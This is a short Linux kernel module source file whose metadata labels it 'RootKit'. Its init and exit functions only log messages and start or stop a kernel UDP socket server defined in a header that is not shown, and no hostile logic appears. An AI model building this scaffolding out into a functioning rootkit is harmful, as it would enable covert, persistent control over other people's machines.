#include <linux/module.h>
#include <linux/kernel.h>  // For printk
#include "include/udp_server.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("2600");
MODULE_DESCRIPTION("RootKit");
MODULE_VERSION("0.1");

// Initialization function
static int __init start_module(void) {
    printk(KERN_INFO "INIT\n");
    ksocket_init();  // Call your hello_world function
    return 0;  // Return 0 to indicate successful initialization
}

// Cleanup function
static void __exit exit_module(void) {
    printk(KERN_INFO "Exit\n");
    ksocket_exit();
}

module_init(start_module);  // Register the initialization function
module_exit(exit_module);    // Register the cleanup function
